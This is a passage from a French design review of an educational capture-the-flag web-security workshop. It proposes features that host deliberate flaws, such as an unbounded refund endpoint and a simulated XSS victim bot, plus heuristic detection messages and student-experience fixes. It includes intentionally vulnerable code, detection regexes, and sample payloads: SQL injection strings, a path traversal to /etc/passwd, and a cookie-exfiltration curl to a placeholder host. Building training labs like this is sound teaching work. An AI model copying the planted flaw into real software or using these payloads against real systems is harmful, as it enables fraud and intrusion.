([products.js:107-109](../server/src/routes/products.js#L107-L109)) ; il n'existe ni table
`orders`, ni notion de commande consultable. C'est une fonctionnalité que toute boutique a,
donc elle est crédible sans être plaquée.

**La fonctionnalité** : une page « Mes commandes » listant les achats, avec un bouton
« Demander un remboursement » (quantité à rembourser + motif).

**La vulnérabilité qu'elle héberge** : la quantité remboursée n'est pas bornée par la
quantité achetée.

```js
// POST /api/orders/:id/refund — VULNERABLE: refundQty n'est jamais comparé à order.qty
const credited = order.unit_price * parseInt(req.body.refundQty);
db.prepare('UPDATE users SET balance = balance + ? WHERE id = ?').run(credited, req.user.id);

awardFlag(req, response, 'BUSINESS_LOGIC', {
  proof: 'refund_exceeds_purchase',   // ← l'acte, pas le solde
  paid: order.total, refunded: credited,
});
```

**Pourquoi c'est isolé** : la condition devient `montant remboursé > montant payé`, un état
produit **uniquement** par cet endpoint. Le panneau admin écrit dans `users.balance`
([admin.js:65](../server/src/routes/admin.js#L65)), jamais dans `orders` ; le top-up non
plus. Les deux chemins parasites de [T-07](#t-07--ladmin-peut-valider-le-challenge-1000-crédits-par-effet-de-bord) s'éteignent sans qu'on ait à brider le panneau admin
— qui reste un outil d'animation utile.

**Bénéfice pédagogique** : c'est une faille de logique métier bien plus réaliste que le
virement négatif (les abus de remboursement sont un classique de la fraude e-commerce), et
elle se raconte en une phrase à la restitution.

**Coût** : ~2–3 h (table `orders`, deux endpoints, une page React, seed des commandes).

## A2 — « Signaler un problème » (support client) → héberge le vol de cookie

**Résout** : [T-04](#t-04--auto-pwn-sur-le-challenge--vol-de-cookie) (auto-pwn), de la façon la plus propre.

**Ce qui manque aujourd'hui** : aucun acteur tiers ne visite l'application. Le joueur est
seul, donc le seul cookie qu'il peut voler est le sien — l'auto-pwn n'est pas un bug, c'est
la conséquence directe de l'absence de victime.

**La fonctionnalité** : sur une fiche produit, « Signaler un problème sur cet avis » →
le formulaire annonce qu'« un conseiller va consulter la page ». Quelques secondes plus
tard, un agent visite effectivement la page signalée.

**La vulnérabilité qu'elle héberge** : le XSS stocké des avis
([reviews.js:38-50](../server/src/routes/reviews.js#L38-L50)) s'exécute alors dans la
session du conseiller, dont le cookie `support_session` contient le flag en base64 —
exactement la piste suggérée par le testeur.

**Pourquoi c'est isolé** : le joueur ne possède pas, et ne peut pas fabriquer, le cookie du
conseiller. `curl '<qg>/log?c=<mon_jwt>'` ne donne plus rien. Le flag ne tombe que si un
payload s'est réellement exécuté dans un navigateur tiers — la définition même du
challenge.

**Deux niveaux d'implémentation** :

| | Bot réel (Puppeteer) | Bot simulé (sans navigateur) |
| --- | --- | --- |
| Fidélité | Totale : tout payload XSS valide fonctionne | Partielle : seules les formes détectées par regex |
| Coût | ~4 h + un Chromium par instance | ~1 h |
| Mémoire | Rédhibitoire en l'état — voir [T-02](#t-02--chute-du-service-sur-le-port-44003), les conteneurs sont à 128–256 Mo | Négligeable |

Compte tenu de [T-02](#t-02--chute-du-service-sur-le-port-44003), **commencer par le bot simulé** : un job serveur qui relit le
contenu signalé, détecte une exfiltration vers une URL externe et émet la requête avec le
cookie du conseiller. C'est une simulation assumée — elle n'accepte pas *tous* les
payloads — mais elle supprime l'auto-pwn pour un coût mémoire nul, et le passage à
Puppeteer reste possible plus tard sans changer le contrat côté joueur.

**Coût** : ~1 h (simulé).

## Ce qu'il ne faut pas faire

- **Une fonctionnalité par vulnérabilité.** Douze pages métier pour douze challenges
  donneraient une application incohérente, et surtout douze surfaces qui se
  re-chevaucheraient. Les dix autres tickets se règlent par la condition d'attribution.
- **Une fonctionnalité qui n'existe que pour le CTF.** Si un participant devine qu'une page
  n'a pas d'autre raison d'être que d'abriter une faille, il la cherche par élimination au
  lieu de la trouver par méthode. « Mes commandes » et « Signaler un problème » passent ce
  test : les deux existent sur n'importe quelle boutique en ligne.

---

# Annexe B — Détection et messages : trois classes de réponse

> Question posée : *comment garantir qu'une vulnérabilité est attendue dans un scénario et
> pas un autre — de la détection combinée à des messages d'erreur ?*

✅ **Implémentée** : `server/src/detect.js` (`4b53728`), affichage côté joueur (`a89713e`).

Oui, et c'est le complément naturel de `awardFlag()` ([T-12](#t-12--chevauchement-des-scénarios-entre-challenges)). Mais la détection doit
servir à **orienter**, jamais à **attribuer** — cette distinction est la totalité du
sujet.

## Les trois classes

Chaque requête tombe dans une seule de ces trois classes, et chacune a une réponse propre :

| Classe | Déclencheur | Réponse au joueur | Flag | Journal |
| --- | --- | --- | --- | --- |
| ✅ **Exploitation** | Effet réel observé, preuve fournie | Message nommant l'acte : « montant remboursé supérieur au montant payé » | **Oui** | `award` |
| 🟡 **Bonne technique, mauvais endroit** | Signature heuristique sur un endpoint qui n'est pas celui du challenge | Orientation : « ton injection passe, mais ce champ est échappé à l'affichage — cherche où le HTML est rendu brut » | Non | `near_miss` |
| ⚪ **Bon état, mauvais chemin** | État atteint sans l'acte (effet de bord) | Neutre : « l'état a bien été modifié, mais ce n'est pas le chemin de ce challenge » | Non | `side_effect` |

La classe 🟡 est celle qui manque aujourd'hui, et c'est la plus rentable
pédagogiquement : c'est exactement ce qui aurait évité au testeur de passer à côté de la
SQLi UNION ([T-11](#t-11--la-seconde-injection-sql-na-pas-été-trouvée)) — il a cherché, cassé des requêtes, et n'a reçu qu'un silence
indiscernable d'une recherche sans résultat.

## L'implémentation

Un module `server/src/detect.js`, branché en middleware sur toutes les routes, qui
n'accorde **jamais** de flag :

```js
// detect.js — signatures purement heuristiques, à usage de message uniquement
const SIGNATURES = [
  { id: 'xss',       re: /<\s*(script|img|svg)[^>]*(onerror|onload)?/i },
  { id: 'sqli',      re: /('|%27)\s*(or|union|--)/i },
  { id: 'traversal', re: /\.\.[\/\\]/ },
];
// → produit un event `near_miss` + un message d'orientation. Jamais un flag.
```

`awardFlag()` reste le seul à délivrer des flags, et seulement sur effet réel.

## Le garde-fou, et pourquoi il n'est pas théorique

> **Heuristique pour les messages. Effet réel pour les flags. Jamais l'inverse.**

Ce projet a déjà payé cette leçon : la détection SQLi était `username.includes('--')`, et
donnait donc le flag à quiconque tapait deux tirets dans un champ, sans la moindre
injection. Corrigé en `06053b7`, la condition porte désormais sur le fait que la requête
injectée a réellement retourné une ligne ([auth.js:74](../server/src/routes/auth.js#L74)).
C'est précisément ce faux positif que le testeur a rencontré ([T-06](#t-06--rôles-arbitraires-acceptés-et-validation-du-rôle-admin-par-reconnexion)).

Une heuristique qui se trompe sur un **message** coûte un malentendu de trente secondes.
La même heuristique sur un **flag** offre un challenge et fausse le classement.

## Doser les messages pour ne pas devenir un oracle

Un message trop précis remplace le challenge par une notice. La formulation vise l'état de
l'application, pas la marche à suivre :

- ✅ « Ce champ est échappé avant affichage. » → décrit ce que le joueur vient d'observer.
- ❌ « Essaie plutôt `' UNION SELECT 1,value,3,4,5,6 FROM secrets --` sur la recherche. » →
  donne la réponse, et rend l'indice payant ([`HINT_PENALTY`](ANIMATEUR.md)) sans objet.

Deux garde-fous simples : limiter les messages 🟡 à un par minute et par compte (sinon un
scanner les collectionne et cartographie l'application gratuitement), et les désactiver
globalement par variable d'environnement pour un public avancé — l'équivalent d'un mode
difficulté, qui rejoint la ligne « niveau max configurable » du [TODO](../TODO.md).

## Le bénéfice côté animateur

Les events `near_miss` et `side_effect` alimentent une vue « équipes proches du but » :
savoir qu'une équipe tente du XSS sur le bon champ depuis dix minutes sans succès permet
une relance ciblée, au lieu d'attendre qu'elle demande un indice ou se décourage. C'est la
même table `challenge_events` que celle décrite en [T-12](#t-12--chevauchement-des-scénarios-entre-challenges) — aucune infrastructure
supplémentaire.

---

# Annexe C — Expérience étudiante : améliorations identifiées

Relevé en parcourant les parcours joueur (QG, site, académie), au-delà des retours du
testeur. ✅ **Les six sont implémentés** : C1 `b6b0eec`, C2 `1d35a90`, C3 `a89713e`,
C4 `61218f5`, C5 `561fe65`, C6 `63e58ba`.

## C1 — La progression n'est pas partagée entre les membres d'une équipe 🔴

**C'est le point le plus impactant, et c'est un défaut fonctionnel, pas un confort.**

Les flags capturés et les indices utilisés sont stockés dans le `localStorage` **du
navigateur** ([lib/flags.js:7-20](../exploit-server/client/src/lib/flags.js#L7-L20),
[ChallengesPage.jsx:16-21](../exploit-server/client/src/pages/ChallengesPage.jsx#L16-L21)).
Or une équipe, c'est trois ou quatre personnes sur trois ou quatre machines, partageant un
seul compte QG. Conséquences concrètes en atelier :

- Chacun voit une progression différente ; la vue « Challenges » ne reflète le travail
  d'aucune équipe, seulement celui d'un poste.
- Le **déverrouillage progressif** (`VITE_PROGRESSIVE_UNLOCK`,
  [ChallengesPage.jsx:40-45](../exploit-server/client/src/pages/ChallengesPage.jsx#L40-L45))
  se calcule sur ce `localStorage` : un participant qui rejoint en cours de route, ou qui
  ouvre le QG sur un second poste, voit tout verrouillé alors que son équipe a déjà capturé
  cinq flags.
- Incohérence visible : le Fix-It, lui, interroge désormais le dashboard
  ([exploit-server/src/index.js:159-186](../exploit-server/src/index.js#L159-L186)). Une
  carte peut donc afficher « non capturé » pendant que son Fix-It s'ouvre normalement.

**Solution** : le dashboard est déjà la source de vérité et expose tout le nécessaire. Un
endpoint `GET /api/progress` sur le serveur d'exploit, qui relaie les captures et les
indices de l'équipe, remplace les deux helpers `localStorage`. La fonction `hasCaptured()`
en fournit déjà le patron exact — c'est un branchement, pas une conception.

Le `localStorage` garde son rôle pour ce qui est réellement personnel (thème,
onboarding vu). *Effort : ~1 h.*

## C2 — L'indice est tout-ou-rien, et cher 🟠

Un seul niveau d'indice, à `HINT_PENALTY` points, **visible par toutes les équipes**
([ChallengesPage.jsx:50-67](../exploit-server/client/src/pages/ChallengesPage.jsx#L50-L67)).
Pour un public débutant, le coût social pèse plus que le coût en points : on préfère
bloquer trente minutes plutôt que s'afficher. Résultat, l'outil censé débloquer est
précisément celui qu'on n'ose pas utiliser.

**Solution — deux niveaux** :

1. **Orientation, gratuite et discrète** : dit *où* chercher, pas *quoi* faire (« cette
   vulnérabilité se trouve sur la fiche produit »). Débloquable après N minutes sans
   capture, non diffusée au scoreboard.
2. **Indice actuel, payant et public** : donne la technique. Inchangé.

Le contenu du niveau 1 existe déjà en substance dans le champ `hint` de plusieurs
challenges ; c'est surtout un découpage de [shared/flags.json](../shared/flags.json) en
`hint` / `nudge`. *Effort : ~1 h.*

## C3 — Aucun retour quand on est près du but 🟠

Un débutant qui teste `' OR 1=1--` dans le bon champ mais avec la mauvaise syntaxe reçoit
exactement la même réponse que s'il n'avait rien tenté. Rien ne distingue « tu n'y es pas »
de « tu y es presque » — c'est ce qui a coûté la SQLi UNION au testeur ([T-11](#t-11--la-seconde-injection-sql-na-pas-été-trouvée)).

**Solution** : déjà décrite en [annexe B](#annexe-b--détection-et-messages--trois-classes-de-réponse) (classe 🟡). L'angle étudiant mérite d'être
souligné : c'est la différence entre *chercher* et *tâtonner*. Un « ton injection modifie
bien la requête, mais ce champ n'est pas celui du challenge » transforme un mur en piste.

## C4 — Rien ne dit par où commencer, ni où l'on en est 🟠

La page Challenges affiche douze cartes de même poids visuel
([ChallengesPage.jsx:118-130](../exploit-server/client/src/pages/ChallengesPage.jsx#L118-L130)).
Après l'onboarding, un débutant a douze portes devant lui et aucune raison d'en pousser une
plutôt qu'une autre — le moment exact où un participant décroche.

**Solution** :

- Un bandeau de progression en haut : `4 / 12 challenges · 55 pts · prochain objectif
  suggéré : « Review nulle » (Facile)`. Le « prochain objectif » = le challenge non capturé
  le plus facile, ou le suivant du fil rouge si les prérequis de [T-12](#t-12--chevauchement-des-scénarios-entre-challenges) sont en place.
- Un **premier challenge guidé** (la ligne « aide au 1er flag » du [TODO](../TODO.md)) :
  pour l'IDOR, un pas-à-pas replié qui enseigne la *boucle* — trouver, exploiter,
  soumettre — plutôt que la faille. Une fois la boucle comprise, les onze autres sont
  jouables en autonomie. C'est le meilleur investissement de toute cette annexe pour un
  public qui découvre.

*Effort : ~2 h.*

## C5 — L'académie donne les réponses 🟠

Déjà au [TODO](../TODO.md), confirmé en lecture : les slides utilisent les **endpoints
réels de BananaShop**, pas des exemples neutres. `GET /api/products/image?file=../../../../etc/passwd`
([slides.js:216-225](../exploit-server/client/src/data/slides.js#L216-L225)) *est* la
solution du challenge « Exploration fichiers », payload compris. Idem pour le mass
assignment ([slides.js:286-289](../exploit-server/client/src/data/slides.js#L286-L289)).

L'académie est pourtant le bon réflexe à encourager : on ne veut pas qu'elle devienne un
corrigé, ni la décourager.

**Solution** : réécrire les exemples sur une application fictive (`shop.example/api/...`,
paramètres et noms de champs différents). La technique reste enseignée, la transposition
vers BananaShop reste à faire — et c'est précisément l'exercice. *Effort : ~2 h de
réécriture de contenu.*

## C6 — Frictions de soumission ⚪

Détails peu coûteux, sur le geste le plus répété de l'atelier
([SubmitFlagPage.jsx:10-30](../exploit-server/client/src/pages/SubmitFlagPage.jsx#L10-L30)) :

- La saisie est `trim()`-ée mais pas normalisée : un flag collé depuis une réponse JSON
  arrive souvent avec des guillemets (`"ASY{...}"`) et part en « Flag invalide », sans que
  le joueur comprenne que son flag était bon. Nettoyer guillemets, virgules et espaces
  internes.
- **Message de doublon explicite** : le dashboard renvoie `duplicate: true`, l'UI affiche
  un succès générique. Dire « déjà capturé par ton équipe » évite de croire qu'on vient de
  marquer des points.
- **Coller un flag d'un challenge désactivé** renvoie un message correct
  ([flags.js:25-31](../server/src/routes/flags.js#L25-L31)) : bon point, à garder tel quel.

*Effort : ~30 min.*

## Ce qui fonctionne déjà bien, et qu'il ne faut pas casser

Le testeur a trouvé l'ensemble « très abordable pour un public qui débute », et plusieurs
choix y contribuent directement — à préserver lors des refontes ci-dessus :

- L'onboarding verrouillé par un **flag de démarrage** caché dans le tutoriel Burp
  ([OnboardingModal.jsx:267-304](../exploit-server/client/src/components/OnboardingModal.jsx#L267-L304))
  garantit que les instructions sont lues. C'est la réponse à « ils ne lisent pas tout » du
  [TODO](../TODO.md), et elle marche.
- Le **Fix-It après capture** ferme la boucle pédagogique : on exploite, puis on voit le
  correctif. C'est ce qui distingue cet atelier d'un CTF classique.
- Le **rapport exportable** ([ExportPage.jsx](../exploit-server/client/src/pages/ExportPage.jsx))
  donne une trace à remporter — rare, et apprécié en formation.
